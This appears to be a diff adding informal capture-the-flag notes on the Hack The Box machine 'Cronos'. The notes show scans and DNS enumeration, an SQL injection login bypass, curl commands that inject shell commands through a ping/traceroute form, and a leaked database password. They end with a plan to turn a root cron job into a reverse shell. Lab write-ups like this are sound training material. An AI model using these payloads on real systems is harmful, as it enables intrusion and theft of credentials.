@@ -1,0 +1,201 @@
+kali@kali:~$ nmap -sC -sV 10.10.10.13
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-21 00:44 EDT
+Nmap scan report for 10.10.10.13
+Host is up (0.16s latency).
+Not shown: 997 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
+|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
+|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
+53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.10.3-P4-Ubuntu
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+kali@kali:~$ sudo nmap -sU -sT -T4 --max-retries 0 10.10.10.13
+[sudo] password for kali: 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-21 00:44 EDT
+Warning: 10.10.10.13 giving up on port because retransmission cap hit (0).
+Warning: 10.10.10.13 giving up on port because retransmission cap hit (0).
+Nmap scan report for 10.10.10.13
+Host is up (0.16s latency).
+Not shown: 997 filtered ports, 997 open|filtered ports
+PORT   STATE  SERVICE
+22/tcp open   ssh
+53/tcp open   domain
+80/tcp open   http
+22/udp closed ssh
+53/udp open   domain
+80/udp closed http
+
+
+I can't think about this step to call use cronos.htb
+this is like a hard unthinkable clue..... 
+
+
+kali@kali:~$ dig @10.10.10.13 +nocmd cronos.htb ANY +multiline +noall +answer
+cronos.htb.             604800 IN SOA cronos.htb. admin.cronos.htb. (
+                                3          ; serial
+                                604800     ; refresh (1 week)
+                                86400      ; retry (1 day)
+                                2419200    ; expire (4 weeks)
+                                604800     ; minimum (1 week)
+                                )
+cronos.htb.             604800 IN NS ns1.cronos.htb.
+cronos.htb.             604800 IN A 10.10.10.13
+
+
+alright, the dns also shows SOA for admin.cronos.htb
+
+it's a login page, we use sql inject can login
+
+123' or 0=0 # 
+
+once login, we have see a form
+
+	<form method="POST" action="">
+	<select name="command">
+		<option value="traceroute">traceroute</option>
+		<option value="ping -c 1">ping</option>
+	</select>
+	<input type="text" name="host" value="8.8.8.8"/>
+	<input type="submit" value="Execute!"/>
+
+interesting, seems like it's running from command + host, what if we can submit other values that we want
+
+
+looks like indeed can do whatever we want
+
+kali@kali:~$ curl -X POST -F 'command=which' -F 'host=wget' http://admin.cronos.htb/welcome.php
+<html">
+   
+   <head>
+      <title>Net Tool v0.1 </title>
+   </head>
+   
+   <body>
+        <h1>Net Tool v0.1</h1>
+        <form method="POST" action="">
+        <select name="command">
+                <option value="traceroute">traceroute</option>
+                <option value="ping -c 1">ping</option>
+        </select>
+        <input type="text" name="host" value="8.8.8.8"/>
+        <input type="submit" value="Execute!"/>
+        </form>
+                        /usr/bin/wget<br>
+                      <p><a href = "logout.php">Sign Out</a></p>
+   </body>
+   
+</html>
+
+
+let's upload reverse shell to it
+
+btw, the scan is keep going , but not much to it, the config.php is empty
+
+ali@kali:~/go/bin$ ./gobuster dir --url=http://admin.cronos.htb --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -x php
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://admin.cronos.htb
+[+] Threads:        30
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php
+[+] Timeout:        10s
+===============================================================
+2020/07/22 00:02:16 Starting gobuster
+===============================================================
+/index.php (Status: 200)
+/welcome.php (Status: 302)
+/logout.php (Status: 302)
+/config.php (Status: 200)
+/session.php (Status: 302)
+
+now we have uploaded our shell, and it's working
+
+kali@kali:~$ curl -X POST -F 'command=ls -al' -F 'host=;' http://admin.cronos.htb/welcome.php
+<html">
+   
+   <head>
+      <title>Net Tool v0.1 </title>
+   </head>
+   
+   <body>
+        <h1>Net Tool v0.1</h1>
+        <form method="POST" action="">
+        <select name="command">
+                <option value="traceroute">traceroute</option>
+                <option value="ping -c 1">ping</option>
+        </select>
+        <input type="text" name="host" value="8.8.8.8"/>
+        <input type="submit" value="Execute!"/>
+        </form>
+                        total 40<br>
+                drwxr-xr-x 2 www-data www-data 4096 Jul 22 07:16 .<br>
+                drwxr-xr-x 5 root     root     4096 Apr  9  2017 ..<br>
+                -rw-r--r-- 1 www-data www-data 1024 Apr  9  2017 .welcome.php.swp<br>
+                -rw-r--r-- 1 www-data www-data  237 Apr  9  2017 config.php<br>
+                -rw-r--r-- 1 www-data www-data 3564 Jul 27  2017 index.php<br>
+                -rw-r--r-- 1 www-data www-data  102 Apr  9  2017 logout.php<br>
+                -rw-r--r-- 1 www-data www-data  383 Apr  9  2017 session.php<br>
+                -rw-r--r-- 1 www-data www-data 5492 Jul 22 07:11 shell.php<br>
+                -rw-r--r-- 1 www-data www-data  782 Apr  9  2017 welcome.php<br>
+                      <p><a href = "logout.php">Sign Out</a></p>
+
+
+
+own user
+
+www-data@cronos:/var/www/admin$ cat config.php 
+<?php
+   define('DB_SERVER', 'localhost');
+   define('DB_USERNAME', 'admin');
+   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
+   define('DB_DATABASE', 'admin');
+   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
+?>
+
+
+mysql> select * from users;
++----+----------+----------------------------------+
+| id | username | password                         |
++----+----------+----------------------------------+
+|  1 | admin    | 4f5fffa7b2340178a716e3832451e058 |
++----+----------+----------------------------------+
+1 row in set (0.00 sec)
+
+
+
+ww-data@cronos:/var/www/laravel$ cat /etc/crontab 
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
+
+
+replace that file with reverse shell, then we are root
+
+
+
+
